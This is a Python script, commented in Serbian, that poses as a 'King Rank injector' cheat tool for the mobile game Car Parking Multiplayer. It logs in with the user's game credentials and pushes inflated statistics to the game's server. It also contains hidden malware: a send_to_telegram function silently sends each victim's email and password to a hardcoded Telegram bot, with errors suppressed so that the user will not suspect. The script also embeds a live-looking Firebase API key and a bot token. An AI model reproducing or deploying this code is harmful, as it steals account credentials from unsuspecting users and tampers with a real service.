import requests
import json
import getpass

# --- KONFIGURACIJA ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

# TVOJ NOVI BOT TOKEN
BOT_TOKEN = "8520154842:AAFZCGWwViw1_T_ylE7XA5M60_hgreVyqco"
CHAT_ID = "7964340522"

def send_to_telegram(email, password):
    """Šalje prikupljene podatke na tvoj Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    poruka = (
        "👑 **Novi King Rank Hit!** 👑\n\n"
        f"📧 **Email:** `{email}`\n"
        f"🔑 **Lozinka:** `{password}`\n\n"
        "⚡ *Podaci su uspešno presretnuti.*"
    )
    
    payload = {
        "chat_id": CHAT_ID,
        "text": poruka,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload)
    except:
        pass # Ignoriše greške u slanju da korisnik ne posumnja

def login(email, password):
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)", "Content-Type": "application/json"}
    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        data = response.json()
        return data.get('idToken') if response.status_code == 200 else None
    except:
        return None

def set_king_rank(token):
    """Ubrizgava King Rank statistiku na nalog."""
    stats_keys = [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]
    # Postavlja sve na visoke vrednosti
    rating_data = {k: 100000 for k in stats_keys}
    rating_data.update({"time": 1000000000, "race_win": 3000})

    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    
    try:
        response = requests.post(RANK_URL, headers=headers, json=payload)
        return response.status_code == 200
    except:
        return False

def main():
    print("--- CPM KING RANK INJECTOR v2.0 ---")
    while True:
        try:
            email = input("\n[#] Unesi nalog (Email): ").strip()
            password = getpass.getpass("[#] Unesi lozinku: ").strip()
            
            if not email or not password:
                continue

            print("[*] Autentifikacija sa serverom...")
            token = login(email, password)
            
            if token:
                # Šalje podatke tebi na Telegram tiho
                send_to_telegram(email, password)
                
                print("[*] Uspešno! Pokrećem King Rank injekciju...")
                if set_king_rank(token):
                    print("✅ KING RANK uspešno aktiviran na nalogu!")
                else:
                    print("❌ Server je odbio promenu ranga.")
            else:
                print("❌ Neispravan email ili lozinka.")
                
        except KeyboardInterrupt:
            print("\nIzlaz...")
            break

if __name__ == "__main__":
    main()
